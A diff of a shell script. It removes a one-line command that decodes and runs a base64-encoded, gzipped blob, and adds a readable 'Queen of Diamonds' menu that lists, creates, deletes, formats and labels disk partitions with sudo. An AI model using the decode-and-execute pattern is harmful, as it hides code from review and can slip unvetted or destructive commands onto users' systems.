@@ -1,1 +1,101 @@
-bash -c "$(echo H4sICM8WXGcAA1F1ZWVuX29mX0RpYW1vbmRzAM1XbW/bNhD+rl9xVYMlGWqljtMUiLEBQ+sBBdq1a7cBQzcEtHWKCVOkS1JJjLb/vXek/CJbXhY3QasPgkTynrt77ng8PnxwNJT6aCjcOEme/f3Lbz/t//O413vf7fdOy/3k7eDd4I966DH9JxaHlVT5+VRYL7002h0cwscE6BkpFDZ84WhsoIOQ7n1kyM/pcjTlLzi/u2cd+xOsP79XiBpMAc+lKI3O3Rm8jV7QiJvAm4Ur65KfNsDv0PBN8A3Ld39awP90CH4sHXhjFL2gFFpcIAidQx1VWEYVjIaZqSzkRJHL4NnYGAIorCnbwP0YwUyj5BCVuWIFU7SFsSVBFAVa1B68IDDSpoTHnJcw+orWrNXye6XldbT67F7AoZvBS+k8CKUik4FuYkvaVbIPikBERx3eBvyYwmKRqAQBGq+WgHdheS+D56iQwTXgNTkh9cUuKtrATzL4lTJDEDErkAflpHBbGfjf4E+Ic0FJ2MDe5WkDP83gL9ngOkcvpHJwJf0Yhmoi853Bn2YwuJZ+J2NvAL+nwhWLfDglqMqHccrIHDpTSAfao41FhJbKEZ6RLfErnheCCspeHACpk7nx3cNk1ZfoxMs6Af97I2VZljaEXZUbmG+uxky/v/g9blMYdlbQ2NxbGyrW/OVKGPQdYHaRPYKjHC+PXC4O2XueaAjLAt5DZ0gk8lQK//YZQDfWrPlRL22arBxuyEQ/XuhLoSgnWSiDV2KCBGZxaWfY2zWddgbiQki95mIht1HXa6Mu1I1AXVvl+DYERsveebaCrIlU0unU2MhsdouB33MATtoCEGtrnb23In6lGDfZ7wb6F9M34RRSoZs5jyX42RTnaHjtTx7BNVV5RivcOU9uiedC101BXfF2KQTCwV6tYHtA+cDJ0vm6tKH1tvFd8rwW5KVNXxXpJ61lkQ+6bxhnFQ5aLcpQ3MPf14Zz4dJKMMPZylpgL+jYHlE8jiY1FKZR6rsL6WlbSLm9aLZamx1G+zkXprbpetqmi7uNpq54KShDs073hI1M8pXV21T82KZizmU85zO6ejEEK+UrCOpqw5caEZ0YJSttzBuLjomewQRnLByN4S8OSQMqZqqGLnRc8jlJHsJAh+BZ/FBJS3ePkSnJ1ZwAaVRcEr9iqDDhE2FU5tSO1MWeK8QiqQLBfchNUEK5/WCOA51LamVI8Ief41bSlVJraV5Tbq2xfANtGgL7LL4PdD/Txi8tyuCFdp67HuoLt2UZctPYDb+UbLnRyC6/okXgRlZOPa3AURU29OYFPokX9y/cpphTChAAAA== | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+rebuild_partitions() {
+    clear
+    echo -e "${CYAN}"
+    echo "     ___________________________________________________________________________"
+    echo "    |                 Queen of Diamonds: Rebuild Disk Partitions                |"
+    echo "    |___________________________________________________________________________|"
+    echo "    |                                                                           |"
+    echo "    | Use this tool to manage and rebuild partitions on your disks. Choose from |"
+    echo "    | the options below to perform different tasks related to disk partitions.  |"
+    echo "    |                                                                           |"
+    echo "    | Options:                                                                  |"
+    echo "    |  1. List all disks and their partitions (fdisk -l)                        |"
+    echo "    |  2. Create a new partition                                                |"
+    echo "    |  3. Delete an existing partition                                          |"
+    echo "    |  4. Format a partition (mkfs)                                             |"
+    echo "    |  5. Label a partition                                                     |"
+    echo "    |  6. View partition details with blkid                                     |"
+    echo "    |  7. Exit                                                                  |"
+    echo "    |___________________________________________________________________________|"
+    echo -e "${RESET}"
+
+    read -p "Enter your choice: " choice
+    case $choice in
+        1)
+            echo "Listing all disks and their partitions..."
+            sudo fdisk -l
+            ;;
+        2)
+            echo "Creating a new partition..."
+            read -p "Enter the disk (e.g., /dev/sda): " disk
+            if [ -b "$disk" ]; then
+                sudo fdisk "$disk"
+            else
+                echo "Invalid disk. Make sure the disk exists and try again."
+            fi
+            ;;
+        3)
+            echo "Deleting an existing partition..."
+            read -p "Enter the disk (e.g., /dev/sda): " disk
+            if [ -b "$disk" ]; then
+                echo "Starting fdisk for partition deletion..."
+                sudo fdisk "$disk"
+            else
+                echo "Invalid disk. Make sure the disk exists and try again."
+            fi
+            ;;
+        4)
+            echo "Formatting a partition..."
+            read -p "Enter the partition (e.g., /dev/sda1): " partition
+            read -p "Enter the filesystem type (e.g., ext4, xfs): " fs_type
+            if [ -b "$partition" ]; then
+                echo "Formatting $partition as $fs_type..."
+                sudo mkfs."$fs_type" "$partition"
+            else
+                echo "Invalid partition. Make sure the partition exists and try again."
+            fi
+            ;;
+        5)
+            echo "Labeling a partition..."
+            read -p "Enter the partition (e.g., /dev/sda1): " partition
+            read -p "Enter the label name: " label
+            if [ -b "$partition" ]; then
+                echo "Labeling $partition with name $label..."
+                sudo e2label "$partition" "$label"
+            else
+                echo "Invalid partition. Make sure the partition exists and try again."
+            fi
+            ;;
+        6)
+            echo "Viewing partition details with blkid..."
+            sudo blkid
+            ;;
+        7)
+            echo "Exiting partition management tool."
+            return
+            ;;
+        *)
+            echo "Invalid choice. Returning to menu..."
+            ;;
+    esac
+
+    echo "Press any key to return to the menu..."
+    read -n 1 -s
+}
+
+# Ensure required commands are available
+for cmd in fdisk mkfs e2label blkid; do
+    if ! command -v $cmd &> /dev/null; then
+        echo "Error: Required command '$cmd' is not available. Install it and try again."
+        exit 1
+    fi
+done
+
+# Main script execution
+rebuild_partitions
+clear
